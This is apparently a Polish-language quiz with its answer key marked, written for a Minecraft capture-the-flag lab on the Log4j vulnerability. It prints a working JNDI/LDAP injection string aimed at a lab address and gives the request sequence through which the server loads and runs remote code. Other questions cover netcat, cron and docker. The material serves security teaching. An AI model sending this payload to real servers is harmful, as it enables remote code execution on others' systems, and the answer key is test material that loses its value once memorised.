
1. Który payload wysłany na chacie Minecrafta poprawny składniowo:
=>  a. ${jndi:ldap://10.5.0.1:1389/SafeClass}
    b. ${jndi:ldap//10.5.0.1/1389/SafeClass}
    c. ${jndi://ldap:10.5.0.1/1389:SafeClass}
    d. ${jndi:ldap//10.5.0.1:1389/SafeClass}

2. Jaka jest poprawna kolejność zapytań podczas wykorzystywania podatności Log4j:
=>  a. McClient -> McServer -> LDAP -> McServer -> HttpServer -> McServer executes code
    b. McClient -> McServer -> LDAP -> HttpServer -> McServer executes code
    c. McClient ->  LDAP -> HttpServer -> McServer executes code
    d. McClient -> McServer ->  LDAP -> HttpServer executes code

3. Czym jest netcat?
=>  a. Program do nawiązywania połączeń TCP, wysyłania, odbierania ruchu UDP, przesyłania dowolnych danych, ułatwia skryptowanie, bardzo fajny,
    b. Alias na Nyan Cat,
    c. Coś jak cURL - jedynie wyświetla zawartość zasobów sieciowych pod danym URI,
    d. Network Catastrophe - program crashujący cały internet - zakazany przez konwencje genewską, jest karany surowiej niż użycie "avada kedavra",

4. Co to cron?
=>  a. daemon uruchamiający regularnie powtarzane zadania,
    b. nazwa na skrypt,
    c. komenda do wyświetlania logów, kronik,
    d. edytor plików,

5. Która komenda uruchomić kontener `kwasnyy/mcctf:mcexpl` publishując 25565 port kontenera na naszym 2500?
=>  a. `docker run -p 2500:25565 -ti kwasnyy/mcctf:mcexpl`
    b. `docker run -p 25565:2500 -tid kwasnyy/mcctf:mcexpl`
    b. `docker run 25565:2500 -d kwasnyy/mcctf:mcexpl`
    b. `docker run 25565:2500 kwasnyy/mcctf:mcexpl`